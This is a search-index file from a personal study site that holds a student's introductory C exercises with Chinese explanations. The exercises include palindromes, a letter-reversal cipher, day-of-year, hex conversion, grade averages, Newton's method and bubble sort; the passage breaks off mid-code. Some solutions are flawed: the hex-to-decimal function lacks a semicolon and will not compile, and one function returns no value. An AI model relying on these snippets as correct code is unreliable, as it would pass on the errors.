{"config":{"lang":["zh","en","ja"],"separator":"[\\s\\u200b\\u3000\\-\u3001\u3002\uff0c\uff0e\uff1f\uff01\uff1b]+","pipeline":["stemmer"]},"docs":[{"location":"","title":"\u4f60\u597d","text":"<p>\u8fd9\u91cc\u662f\u4faf\u9716\u94b0\u7684\u4e2a\u4eba\u7f51\u7ad9 https://AnistonH.github.io</p> <ul> <li>\u901a\u8fc7\u4e3b\u9898\u548c\u76ee\u5f55\u4ee5\u6253\u5f00\u6587\u7ae0<ul> <li>\u5efa\u8bae\u4f7f\u7528 PC \u8bbf\u95ee\u8be5\u7f51\u7ad9</li> <li>PC\u7aef \u5728\u4e0a\u65b9\u6807\u7b7e\u680f\u9009\u62e9\u4e3b\u9898 \u5728\u5de6\u4fa7\u76ee\u5f55\u9009\u62e9\u6587\u7ae0</li> <li>\u79fb\u52a8\u7aef \u70b9\u51fb\u5de6\u4e0a\u89d2\u56fe\u6807\u9009\u62e9\u4e3b\u9898\u548c\u6587\u7ae0</li> </ul> </li> <li>\u641c\u7d22\u5173\u952e\u8bcd\u4ee5\u6253\u5f00\u6587\u7ae0</li> <li>\u6587\u7ae0\u5185\u90e8\u76ee\u5f55\u8bf4\u660e\uff1a<ul> <li>PC\u7aef \u53f3\u4fa7\u680f\u4e3a\u6587\u7ae0\u5185\u90e8\u76ee\u5f55</li> <li>\u79fb\u52a8\u7aef \u70b9\u51fb\u5de6\u4e0a\u89d2\u56fe\u6807\uff0c\u518d\u70b9\u51fb\u6b64\u65f6\u5bf9\u5e94\u6587\u7ae0\u53f3\u4fa7\u7684\u56fe\u6807</li> </ul> </li> </ul> <p>\u66f4\u65b0\u4e8e 2024-09-20</p>"},{"location":"#_2","title":"\u4e2a\u4eba\u73b0\u72b6","text":"<ul> <li>\u4e2d\u5317\u5927\u5b66\u4e0e\u4e2d\u5317\u5927\u5b66-\u7f51\u7edc\u884c\u4e3a\u5206\u6790\u5b9e\u9a8c\u5ba4<ul> <li>\u4e3b\u8981\u5b66\u4e60\u65b9\u5411\uff1a<ul> <li>\u8f6f\u4ef6\u5de5\u7a0b</li> <li>\u7f51\u7edc\u5b89\u5168</li> </ul> </li> </ul> </li> </ul>"},{"location":"#_3","title":"\u4e2a\u4eba\u4fe1\u606f","text":"<p>\u66f4\u591a\u4fe1\u606f\u8bf7\u67e5\u770b \u4e2a\u4eba\u4ecb\u7ecd</p>"},{"location":"DEC/","title":"\u5f00\u53d1","text":"<p>\u70b9\u51fb\u5de6\u4fa7\u76ee\u5f55\u6253\u5f00\u6587\u7ae0</p>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/","title":"Alpha \u51fd\u6570","text":""},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#1","title":"1","text":"<p>\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c<code>fun</code> \u51fd\u6570\u7528\u4e8e\u5224\u65ad\u4e00\u4e2a\u6574\u6570\u662f\u5426\u662f\u56de\u6587\u6570\u3002\u5b83\u901a\u8fc7\u5c06\u539f\u59cb\u6570\u5b57\u9006\u5e8f\u751f\u6210\u4e00\u4e2a\u65b0\u7684\u6570\u5b57\uff0c\u7136\u540e\u4e0e\u539f\u59cb\u6570\u5b57\u8fdb\u884c\u6bd4\u8f83\uff0c\u5982\u679c\u76f8\u7b49\u5219\u4e3a\u56de\u6587\u6570\u3002\u7a0b\u5e8f\u9996\u5148\u63a5\u53d7\u7528\u6237\u8f93\u5165\u7684\u6570\u5b57\uff0c\u7136\u540e\u8c03\u7528 <code>fun</code> \u51fd\u6570\u8fdb\u884c\u5224\u65ad\uff0c\u5e76\u8f93\u51fa\u7ed3\u679c\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nint fun(int num);\n\nint main() {\n    int num;\n\n    // \u8f93\u5165\u6570\u5b57\n    scanf(\"%d\", &amp;num);\n\n    // \u8c03\u7528\u51fd\u6570\u5224\u65ad\u662f\u5426\u4e3a\u56de\u6587\u6570\n    if (fun(num)) {\n        printf(\"%d\u662f\u56de\u6587\u6570\\n\", num);\n    }\n    else {\n        printf(\"%d\u4e0d\u662f\u56de\u6587\u6570\\n\", num);\n    }\n\n    return 0;\n}\n\n// \u5224\u65ad\u662f\u5426\u4e3a\u56de\u6587\u6570\u7684\u51fd\u6570\nint fun(int num) {\n    int start = num;\n    int result = 0;\n\n    while (num &gt; 0) {\n        result = result * 10 + num % 10;\n        num /= 10;\n    }\n\n    // \u5224\u65ad\u53cd\u8f6c\u540e\u7684\u6570\u662f\u5426\u4e0e\u539f\u6570\u76f8\u7b49\n    return start == result;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#2","title":"2","text":"<p>\u8fd9\u4e2a\u7a0b\u5e8f\u9996\u5148\u63a5\u53d7\u7528\u6237\u8f93\u5165\u7684\u6b63\u6574\u6570\u3002\u63a5\u7740\uff0c\u7a0b\u5e8f\u8ba1\u7b97\u6700\u9ad8\u4f4d\u7684\u9664\u6570\uff0c\u7136\u540e\u901a\u8fc7\u5faa\u73af\u4ece\u9ad8\u4f4d\u5230\u4f4e\u4f4d\u8f93\u51fa\u5404\u4f4d\u4e0a\u7684\u6570\u5b57\u3002\u6700\u540e\uff0c\u7ed3\u675f\u6267\u884c\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nint HLY(int num);\n\nint main() {\n    int num;\n\n    // \u8f93\u5165\u6b63\u6574\u6570\n    scanf(\"%d\", &amp;num);\n\n    HLY(num);\n\n    return 0;\n}\n\nint HLY(num) {\n    int temp = num;\n    int aa;\n    int result = 1;\n\n    // \u8ba1\u7b97\u6700\u9ad8\u4f4d\u7684\u9664\u6570\n    while (temp &gt;= 10) {\n        temp /= 10;\n        result *= 10;\n    }\n\n    // \u4ece\u9ad8\u4f4d\u5230\u4f4e\u4f4d\u8f93\u51fa\u5404\u4f4d\u4e0a\u7684\u6570\u5b57\n    while (result &gt; 0) {\n        aa = num / result;\n        printf(\"%d \", aa);\n        num %= result;\n        result /= 10;\n    }\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#3","title":"3","text":"<p>\u8fd9\u4e2a\u7a0b\u5e8f\u9996\u5148\u63a5\u53d7\u7528\u6237\u8f93\u5165\u7684\u5c0f\u5199\u5b57\u6bcd\u3002\u63a5\u7740\uff0c\u7a0b\u5e8f\u6839\u636e\u89c4\u5219\u5c06\u5c0f\u5199\u5b57\u6bcd\u8f6c\u6362\u4e3a\u5bc6\u7801\uff0c\u7136\u540e\u8f93\u51fa\u5bc6\u7801\u3002\u6700\u540e\uff0c\u7a0b\u5e8f\u8fd4\u56de0\u8868\u793a\u6b63\u5e38\u6267\u884c\u3002(\u7a0b\u5e8f\u6839\u636e\u7ed9\u5b9a\u7684\u89c4\u5219\u8ba1\u7b97\u76f8\u5e94\u7684\u5bc6\u7801\u5b57\u7b26\u3002\u5b83\u4ece\u201cZ\u201d\u4e2d\u51cf\u53bb\u8f93\u5165\u7684\u5c0f\u5199\u5b57\u6bcd\u548c\u201ca\u201d\u4e4b\u95f4\u7684\u5dee\u503c\u3002\u8fd9\u6709\u6548\u5730\u98a0\u5012\u4e86\u5b57\u6bcd\u8868\u7684\u987a\u5e8f\u3002)</p> C<pre><code>#include &lt;stdio.h&gt;\n\nint main() {\n    char low;\n\n    // \u8f93\u5165\u5c0f\u5199\u5b57\u6bcd\n    scanf(\" %c\", &amp;low);\n\n    // \u8f6c\u6362\u4e3a\u5bc6\u7801\n    char password = 'Z' - (low - 'a');\n\n    // \u8f93\u51fa\u5bc6\u7801\n    printf(\"%c\\n\", password);\n\n    return 0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#4","title":"4","text":"<p>\u8fd9\u4e2a\u7a0b\u5e8f\u9996\u5148\u63a5\u53d7\u7528\u6237\u8f93\u5165\u7684\u5e74\u3001\u6708\u3001\u65e5\uff0c\u7136\u540e\u5224\u65ad\u8f93\u5165\u7684\u6708\u4efd\u548c\u65e5\u671f\u662f\u5426\u5408\u6cd5\u3002\u63a5\u7740\uff0c\u7a0b\u5e8f\u8c03\u7528 <code>result</code> \u51fd\u6570\u8ba1\u7b97\u7ed9\u5b9a\u65e5\u671f\u662f\u8be5\u5e74\u7684\u7b2c\u51e0\u5929\uff0c\u5e76\u8f93\u51fa\u7ed3\u679c\u3002\u5728 <code>result</code> \u51fd\u6570\u4e2d\uff0c\u4f7f\u7528\u4e86\u4e00\u4e2a\u6570\u7ec4 <code>daysInMonth</code> \u6765\u5b58\u50a8\u6bcf\u4e2a\u6708\u7684\u5929\u6570\uff0c\u540c\u65f6\u6839\u636e\u95f0\u5e74\u89c4\u5219\u4fee\u6539\u4e8c\u6708\u7684\u5929\u6570\u3002 <code>run_nian</code> \u51fd\u6570\u7528\u4e8e\u5224\u65ad\u662f\u5426\u4e3a\u95f0\u5e74\u3002\u6700\u540e\uff0c\u7a0b\u5e8f\u8fd4\u56de0\u8868\u793a\u6b63\u5e38\u6267\u884c\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nint run_nian(int year);\nint result(int year, int month, int day);\n\nint main() {\n    int year, month, day;\n\n    // \u8f93\u5165\u5e74\u3001\u6708\u3001\u65e5\n    scanf(\"%d\", &amp;year);\n    scanf(\"%d\", &amp;month);\n    scanf(\"%d\", &amp;day);\n\n    // \u5224\u65ad\u95f0\u5e74\u5e76\u8ba1\u7b97\u7b2c\u51e0\u5929\n    int num = result(year, month, day);\n\n    // \u8f93\u51fa\u7ed3\u679c\n    printf(\"%d\\n\", num);\n\n    return 0;\n}\n\n// \u5224\u65ad\u662f\u5426\u4e3a\u95f0\u5e74\u7684\u51fd\u6570\nint run_nian(int year) {\n    // \u95f0\u5e74\u7684\u5224\u65ad\u89c4\u5219\uff1a\u80fd\u88ab4\u6574\u9664\u4f46\u4e0d\u80fd\u88ab100\u6574\u9664\uff0c\u6216\u8005\u80fd\u88ab400\u6574\u9664\n    return (year % 4 == 0 &amp;&amp; year % 100 != 0) || (year % 400 == 0);\n}\n\n// \u8ba1\u7b97\u7b2c\u51e0\u5929\u7684\u51fd\u6570\nint result(int year, int month, int day) {\n    int daysInMonth[] = { 0, 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31 };\n\n    // \u5982\u679c\u662f\u95f0\u5e74\uff0c\u4e8c\u6708\u4efd\u5929\u6570\u52a0\u4e00\n    if (run_nian(year)) {\n        daysInMonth[2] = 29;\n    }\n\n    int num = 0;\n\n    // \u8ba1\u7b97\u524d\u51e0\u4e2a\u6708\u7684\u5929\u6570\u603b\u548c\n    for (int i = 1; i &lt; month; i++) {\n        num += daysInMonth[i];\n    }\n\n    // \u52a0\u4e0a\u5f53\u6708\u7684\u5929\u6570\n    num += day;\n\n    return num;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#5","title":"5","text":"<p>\u8fd9\u4e2a\u7a0b\u5e8f\u4f7f\u7528\u4e86\u9012\u5f52\u7684\u601d\u60f3\uff0c\u5148\u5c06\u9ad8\u4f4d\u6570\u5b57\u8f6c\u6362\u6210\u5b57\u7b26\u4e32\uff0c\u7136\u540e\u518d\u8f93\u51fa\u5f53\u524d\u4f4d\u6570\u5b57\u3002\u9012\u5f52\u7684\u57fa\u672c\u60c5\u51b5\u662f\u5f53 n \u662f\u4e2a\u4f4d\u6570\u65f6\uff0c\u76f4\u63a5\u8f93\u51fa\u3002\u9012\u5f52\u8c03\u7528\u7684\u8fc7\u7a0b\u4e2d\uff0c\u6bcf\u6b21\u90fd\u5c06 n \u9664\u4ee5 10\uff0c\u76f4\u5230 n \u53d8\u6210\u4e2a\u4f4d\u6570\u3002\u5728\u6bcf\u4e00\u6b65\u9012\u5f52\u4e2d\uff0c\u8f93\u51fa\u5f53\u524d\u4f4d\u6570\u5b57\u5bf9\u5e94\u7684\u5b57\u7b26\u3002\u6700\u7ec8\uff0c\u6574\u4e2a\u6570\u5b57\u5c31\u88ab\u9006\u5e8f\u8f93\u51fa\u6210\u5b57\u7b26\u4e32\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nvoid intToString(int n);\n\nint main() {\n    int num;\n\n    // \u8f93\u5165\u6574\u6570\n    scanf(\"%d\", &amp;num);\n\n    // \u8f93\u51fa\u8f6c\u6362\u540e\u7684\u5b57\u7b26\u4e32\n    intToString(num);\n\n    return 0;\n}\n\n// \u9012\u5f52\u51fd\u6570\u5c06\u6574\u6570\u8f6c\u6362\u6210\u5b57\u7b26\u4e32\nvoid intToString(int n) {\n\n    // \u5982\u679c n \u662f\u8d1f\u6570\uff0c\u8f93\u51fa\u8d1f\u53f7\u5e76\u53d6\u7edd\u5bf9\u503c\n    if (n &lt; 0) {\n        printf(\"-\");\n        n = -n;\n    }\n\n    // \u5982\u679c n \u662f\u4e2a\u4f4d\u6570\uff0c\u5219\u76f4\u63a5\u8f93\u51fa\n    if (n &gt;= 0 &amp;&amp; n &lt;= 9) {\n        printf(\"%d\", n);\n        return;\n    }\n\n    // \u9012\u5f52\u8c03\u7528\uff1a\u5148\u8f93\u51fa\u9ad8\u4f4d\u6570\u5b57\uff0c\u7136\u540e\u8f93\u51fa\u5f53\u524d\u4f4d\u6570\u5b57\n    intToString(n / 10);\n    printf(\"%d\", n % 10);\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#6","title":"6","text":"<p>\u8fd9\u4e2a\u7a0b\u5e8f\u9996\u5148\u63a5\u53d7\u7528\u6237\u8f93\u5165\u7684\u5341\u516d\u8fdb\u5236\u6570\uff0c\u7136\u540e\u8c03\u7528 <code>hexToDecimal</code> \u51fd\u6570\u8fdb\u884c\u8f6c\u6362\u3002\u5728 <code>hexToDecimal</code> \u51fd\u6570\u4e2d\uff0c\u5b83\u904d\u5386\u8f93\u5165\u7684\u5341\u516d\u8fdb\u5236\u6570\u7684\u6bcf\u4e00\u4f4d\uff0c\u5c06\u6bcf\u4e00\u4f4d\u7684\u5341\u8fdb\u5236\u503c\u8ba1\u7b97\u51fa\u6765\u5e76\u7d2f\u52a0\uff0c\u6700\u7ec8\u5f97\u5230\u5bf9\u5e94\u7684\u5341\u8fdb\u5236\u6570\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;math.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nint hexToDecimal(char hex[]);\n\nint main() {\n    char hex[20];\n\n    // \u8f93\u5165\u5341\u516d\u8fdb\u5236\u6570\n    scanf(\"%s\", hex);\n\n    // \u8c03\u7528\u51fd\u6570\u8fdb\u884c\u8f6c\u6362\n    int decimal = hexToDecimal(hex);\n\n    // \u8f93\u51fa\u7ed3\u679c\n    printf(\"%d\\n\", decimal);\n\n    return 0;\n}\n\n// \u5341\u516d\u8fdb\u5236\u8f6c\u5341\u8fdb\u5236\u7684\u51fd\u6570\nint hexToDecimal(char hex[]) {\n    int decimal = 0;\n    int length = 0;\n\n    // \u8ba1\u7b97\u5341\u516d\u8fdb\u5236\u6570\u7684\u4f4d\u6570\n    while (hex[length] != '\\0') {\n        length++;\n    }\n\n    // \u4ece\u53f3\u5f80\u5de6\u8ba1\u7b97\u5341\u8fdb\u5236\u6570\n    for (int i = 0; i &lt; length; i++) {\n        char digit = hex[length - i - 1];\n\n        // \u5c06\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u8f6c\u6362\u4e3a\u5bf9\u5e94\u7684\u6570\u5b57\n        int value;\n        if (digit &gt;= '0' &amp;&amp; digit &lt;= '9') {\n            value = digit - '0';\n        }\n        else if (digit &gt;= 'A' &amp;&amp; digit &lt;= 'F') {\n            value = digit - 'A' + 10;\n        }\n        else if (digit &gt;= 'a' &amp;&amp; digit &lt;= 'f') {\n            value = digit - 'a' + 10;\n        }\n\n        // \u8ba1\u7b97\u5bf9\u5e94\u4f4d\u7684\u5341\u8fdb\u5236\u503c\u5e76\u7d2f\u52a0\n        decimal += value * pow(16, i);\n    }\n\n    return decimal\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#7","title":"7","text":"<p>\u8fc7\u4e0d\u4e86\u68c0\u67e5\uff0c\u771f\u62bd\u8c61</p> <p>\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c<code>aver_stu</code> \u51fd\u6570\u8ba1\u7b97\u6bcf\u4e2a\u5b66\u751f\u7684\u5e73\u5747\u6210\u7ee9\uff0c<code>aver_cour</code> \u51fd\u6570\u8ba1\u7b97\u6bcf\u95e8\u8bfe\u7a0b\u7684\u5e73\u5747\u6210\u7ee9\uff0c<code>highest</code> \u51fd\u6570\u627e\u51fa\u6700\u9ad8\u5206\u53ca\u5176\u5bf9\u5e94\u5b66\u751f\u548c\u8bfe\u7a0b\uff0c<code>s_var</code> \u51fd\u6570\u8ba1\u7b97\u5e73\u5747\u5206\u65b9\u5dee\u3002\u4e3b\u51fd\u6570\u4e2d\u8f93\u5165\u5b66\u751f\u6210\u7ee9\u5e76\u8c03\u7528\u76f8\u5e94\u7684\u51fd\u6570\u5b8c\u6210\u529f\u80fd\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\n// \u5b9a\u4e49\u5168\u5c40\u6570\u7ec4\u5b58\u50a8\u6210\u7ee9\nint scores[10][5];\n\n// \u51fd\u6570\u58f0\u660e\nvoid aver_stu(); //\u8ba1\u7b97 10 \u4e2a\u5b66\u751f\u7684\u5e73\u5747\u6210\u7ee9\nvoid aver_cour(); //\u8ba1\u7b97 5 \u95e8\u8bfe\u7a0b\u7684\u5e73\u5747\u6210\u7ee9\nvoid highest(); //\u627e\u51fa\u6700\u9ad8\u5206\u548c\u5b83\u5c5e\u4e8e\u54ea\u4e2a\u5b66\u751f\u3001\u54ea\u95e8\u8bfe\u7a0b\uff0c\u5e76\u5c06\u6700\u9ad8\u5206\u8fd4\u56de\ndouble s_var(); //\u6c42\u5e73\u5747\u5206\u7684\u65b9\u5dee\uff0c\u5e76\u5c06\u65b9\u5dee\u8fd4\u56de\n\nint main() {\n\n    // \u8f93\u5165\u6210\u7ee9\n    for (int i = 0; i &lt; 10; i++) {\n        for (int j = 0; j &lt; 5; j++) {\n            scanf(\"%d\", &amp;scores[i][j]);\n        }\n    }\n\n    // \u8c03\u7528\u51fd\u6570\u5b9e\u73b0\u529f\u80fd\n    //\u8ba1\u7b97 10 \u4e2a\u5b66\u751f\u7684\u5e73\u5747\u6210\u7ee9\n    aver_stu();\n\n    //\u8ba1\u7b97 5 \u95e8\u8bfe\u7a0b\u7684\u5e73\u5747\u6210\u7ee9\n    aver_cour();\n\n    //\u627e\u51fa\u6700\u9ad8\u5206\u548c\u5b83\u5c5e\u4e8e\u54ea\u4e2a\u5b66\u751f\u3001\u54ea\u95e8\u8bfe\u7a0b\uff0c\u5e76\u5c06\u6700\u9ad8\u5206\u8fd4\u56de\n    highest();\n\n    //\u6c42\u5e73\u5747\u5206\u7684\u65b9\u5dee\uff0c\u5e76\u5c06\u65b9\u5dee\u8fd4\u56de\n    printf(\"cariance: \");\n    printf(\"%.2f\\n\", s_var());\n\n    return 0;\n}\n\n// \u8ba1\u7b97\u6bcf\u4e2a\u5b66\u751f\u7684\u5e73\u5747\u6210\u7ee9\nvoid aver_stu() {\n    double avg;\n    printf(\"student's average score: \");\n    for (int i = 0; i &lt; 10; i++) {\n        int sum = 0;\n        for (int j = 0; j &lt; 5; j++) {\n            sum += scores[i][j];\n        }\n        avg = (double)sum / 5;\n\n        printf(\"%.2f  \", avg);\n    }\n    printf(\"\\n\");\n}\n\n// \u8ba1\u7b97\u6bcf\u95e8\u8bfe\u7a0b\u7684\u5e73\u5747\u6210\u7ee9\nvoid aver_cour() {\n    double avg;\n    printf(\"course's average score: \");\n    for (int i = 0; i &lt; 5; i++) {\n        int sum = 0;\n        for (int j = 0; j &lt; 10; j++) {\n            sum += scores[j][i];\n        }\n        avg = (double)sum / 10;\n        printf(\"%.2f  \", avg);\n    }\n    printf(\"\\n\");\n}\n\n// \u627e\u51fa\u6700\u9ad8\u5206\u53ca\u5176\u5bf9\u5e94\u5b66\u751f\u548c\u8bfe\u7a0b\nvoid highest() {\n    double max = scores[0][0];\n    int student = 0, course = 0;\n\n    for (int i = 0; i &lt; 10; i++) {\n        for (int j = 0; j &lt; 5; j++) {\n            if (scores[i][j] &gt; max) {\n                max = scores[i][j];\n                student = i;\n                course = j;\n            }\n        }\n    }\n\n    printf(\"highest: score[%d][%d] = %.2f\\n\", student, course, max);\n}\n\n// \u8ba1\u7b97\u5e73\u5747\u5206\u65b9\u5dee\ndouble s_var() {\n    double sum = 0;\n    double avg;\n    double var = 0;\n\n    // \u8ba1\u7b97\u603b\u5206\n    for (int i = 0; i &lt; 10; i++) {\n        for (int j = 0; j &lt; 5; j++) {\n            sum += scores[i][j];\n        }\n    }\n\n    // \u8ba1\u7b97\u5e73\u5747\u5206\n    avg = sum / (10 * 5);\n\n    // \u8ba1\u7b97\u65b9\u5dee\n    for (int i = 0; i &lt; 10; i++) {\n        for (int j = 0; j &lt; 5; j++) {\n            var += (scores[i][j] - avg) * (scores[i][j] - avg);\n        }\n    }\n\n    return var / (10 * 5);\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#8","title":"8","text":"<p>\u8fd9\u4e2a\u7a0b\u5e8f\u5b9a\u4e49\u4e86\u4e00\u4e2a\u9012\u5f52\u51fd\u6570 <code>p</code>\uff0c\u6839\u636e\u52d2\u8ba9\u5fb7\u591a\u9879\u5f0f\u7684\u9012\u5f52\u516c\u5f0f\u8ba1\u7b97\u591a\u9879\u5f0f\u7684\u503c\u3002\u5728 <code>main</code> \u51fd\u6570\u4e2d\uff0c\u7528\u6237\u8f93\u5165 n \u548c x \u7684\u503c\uff0c\u7136\u540e\u8c03\u7528 <code>p</code> \u51fd\u6570\u8ba1\u7b97\u52d2\u8ba9\u5fb7\u591a\u9879\u5f0f\u7684\u503c\uff0c\u5e76\u8f93\u51fa\u7ed3\u679c\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\ndouble p(int n, int x);\n\nint main() {\n    int n, x;\n\n    // \u8f93\u5165 n \u548c x\n    scanf(\"%d %d\", &amp;n, &amp;x);\n\n    // \u8c03\u7528\u51fd\u6570\u8ba1\u7b97\u52d2\u8ba9\u5fb7\u591a\u9879\u5f0f\u7684\u503c\n    double result = p(n, x);\n\n    // \u8f93\u51fa\u7ed3\u679c\n    printf(\" %.6f\\n\", result);\n\n    return 0;\n}\n\n// \u9012\u5f52\u51fd\u6570\u8ba1\u7b97\u52d2\u8ba9\u5fb7\u591a\u9879\u5f0f\u7684\u503c\ndouble p(int n, int x) {\n    // \u9012\u5f52\u8fb9\u754c\n    if (n == 0) {\n        return 1.0;\n    }\n    else if (n == 1) {\n        return x;\n    }\n\n    // \u9012\u5f52\u516c\u5f0f\n    return ((2.0 * n - 1) * x * p(n - 1, x) - (n - 1) * p(n - 2, x)) / n;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#9","title":"9","text":"<p>\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c<code>solut</code> \u51fd\u6570\u4f7f\u7528\u725b\u987f\u8fed\u4ee3\u6cd5\u6c42\u89e3\u65b9\u7a0b\u7684\u6839\u3002\u5728 <code>main</code> \u51fd\u6570\u4e2d\uff0c\u7528\u6237\u8f93\u5165\u65b9\u7a0b\u7684\u7cfb\u6570\uff0c\u7136\u540e\u8c03\u7528 <code>solut</code> \u51fd\u6570\u6c42\u89e3\u65b9\u7a0b\u7684\u6839\uff0c\u5e76\u8f93\u51fa\u7ed3\u679c\u3002\u7a0b\u5e8f\u8bbe\u7f6e\u4e86\u6700\u5927\u8fed\u4ee3\u6b21\u6570\uff0c\u5982\u679c\u8fed\u4ee3\u6b21\u6570\u8d85\u8fc7\u4e0a\u9650\u800c\u672a\u6536\u655b\u5230\u89e3\uff0c\u4f1a\u8f93\u51fa\u9519\u8bef\u4fe1\u606f\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;math.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\ndouble solut(double a, double b, double c, double d);\n\nint main() {\n    double a, b, c, d;\n\n    // \u8f93\u5165\u65b9\u7a0b\u7684\u7cfb\u6570\n    scanf(\"%lf %lf %lf %lf\", &amp;a, &amp;b, &amp;c, &amp;d);\n\n    // \u8c03\u7528\u51fd\u6570\u6c42\u89e3\u65b9\u7a0b\u7684\u6839\n    double root = solut(a, b, c, d);\n\n    // \u8f93\u51fa\u7ed3\u679c\n    printf(\"%.6f\\n\", root);\n\n    return 0;\n}\n\n// \u725b\u987f\u8fed\u4ee3\u6cd5\u6c42\u89e3\u65b9\u7a0b\u6839\u7684\u51fd\u6570\ndouble solut(double a, double b, double c, double d) {\n    double x0 = 1.0; // \u521d\u59cb\u731c\u6d4b\u503c\n\n    // \u8fed\u4ee3\u6b21\u6570\n    int maxIterations = 1000;\n    int iterations = 0;\n\n    while (iterations &lt; maxIterations) {\n        double f = a * pow(x0, 3) + b * pow(x0, 2) + c * x0 + d; // \u65b9\u7a0b\u503c\n        double df = 3 * a * pow(x0, 2) + 2 * b * x0 + c; // \u65b9\u7a0b\u5bfc\u6570\u503c\n\n        double x1 = x0 - f / df; // \u725b\u987f\u8fed\u4ee3\u516c\u5f0f\n\n        // \u5982\u679c\u8fed\u4ee3\u503c\u7684\u53d8\u5316\u5f88\u5c0f\uff0c\u8ba4\u4e3a\u5df2\u7ecf\u627e\u5230\u4e86\u8fd1\u4f3c\u89e3\n        if (fabs(x1 - x0) &lt; 1e-6) {\n            return x1;\n        }\n\n        x0 = x1;\n        iterations++;\n    }\n\n    // \u5982\u679c\u8fed\u4ee3\u6b21\u6570\u8fbe\u5230\u4e0a\u9650\uff0c\u8f93\u51fa\u9519\u8bef\u4fe1\u606f\n    printf(\"\u725b\u987f\u8fed\u4ee3\u6cd5\u672a\u6536\u655b\u5230\u89e3\u3002\\n\");\n    return 0.0;\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#10","title":"10","text":"<p>\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c<code>bubbleSort</code> \u51fd\u6570\u4f7f\u7528\u5192\u6ce1\u6392\u5e8f\u7b97\u6cd5\u5bf9\u8f93\u5165\u7684\u5b57\u7b26\u4e32\u8fdb\u884c\u6392\u5e8f\u3002\u5728 <code>main</code> \u51fd\u6570\u4e2d\uff0c\u7528\u6237\u8f93\u5165\u4e00\u4e2a\u5305\u542b10\u4e2a\u5b57\u7b26\u7684\u5b57\u7b26\u4e32\uff0c\u7136\u540e\u8c03\u7528 <code>bubbleSort</code> \u51fd\u6570\u8fdb\u884c\u6392\u5e8f\uff0c\u5e76\u8f93\u51fa\u6392\u5e8f\u540e\u7684\u7ed3\u679c\u3002</p> C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nvoid bubbleSort(char string[]);\n\nint main() {\n    char inputString[11]; // \u9884\u7559\u4e00\u4e2a\u4f4d\u7f6e\u5b58\u50a8\u5b57\u7b26\u4e32\u7ed3\u675f\u7b26 '\\0'\n\n    // \u8f93\u5165\u5b57\u7b26\u4e32\n    scanf(\"%s\", inputString);\n\n    // \u8c03\u7528\u51fd\u6570\u8fdb\u884c\u5192\u6ce1\u6392\u5e8f\n    bubbleSort(inputString);\n\n    // \u8f93\u51fa\u6392\u5e8f\u540e\u7684\u5b57\u7b26\u4e32\n    printf(\" %s\\n\", inputString);\n\n    return 0;\n}\n\n// \u5192\u6ce1\u6392\u5e8f\u51fd\u6570\nvoid bubbleSort(char string[]) {\n    int length = strlen(string);\n\n    for (int i = 0; i &lt; length - 1; i++) {\n        for (int j = 0; j &lt; length - i - 1; j++) {\n            // \u5982\u679c\u76f8\u90bb\u4e24\u4e2a\u5b57\u7b26\u987a\u5e8f\u4e0d\u5bf9\uff0c\u4ea4\u6362\u5b83\u4eec\u7684\u4f4d\u7f6e\n            if (string[j] &gt; string[j + 1]) {\n                char temp = string[j];\n                string[j] = string[j + 1];\n                string[j + 1] = temp;\n            }\n        }\n    }\n}\n</code></pre>"},{"location":"DEC/C/Alpha-%E5%87%BD%E6%95%B0/#11","title":"11","text":"<p>\u8fd9\u4e2a\u7a0b\u5e8f\u4e2d\uff0c<code>longestWord</code> \u51fd\u6570\u904d\u5386\u8f93\u5165\u5b57\u7b26\u4e32\uff0c\u6784\u5efa\u6bcf\u4e2a\u5355\u8bcd\u5e76\u6bd4\u8f83\u5176\u957f\u5ea6\uff0c\u627e\u5230\u6700\u957f\u7684\u5355\u8bcd\u3002\u6700\u540e\uff0c\u5c06\u6700\u957f\u7684\u5355\u8bcd\u590d\u5236\u5230\u8f93\u51fa\u53c2\u6570 <code>word</code> \u4e2d\u3002\u4e3b\u51fd\u6570\u4e2d\uff0c\u7528\u6237\u8f93\u5165\u5b57\u7b26\u4e32\uff0c\u7136\u540e\u8c03\u7528 <code>longestWord</code> \u51fd\u6570\uff0c\u8f93\u51fa\u7ed3\u679c\u3002 </p> C<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\n// \u51fd\u6570\u58f0\u660e\nvoid longestWord(char string[], char word[]);\n\nint main() {\n    char inputString[100];\n    char resultWord[50];\n\n    // \u8f93\u5165\u5b57\u7b26\u4e32\n    fgets(inputString, 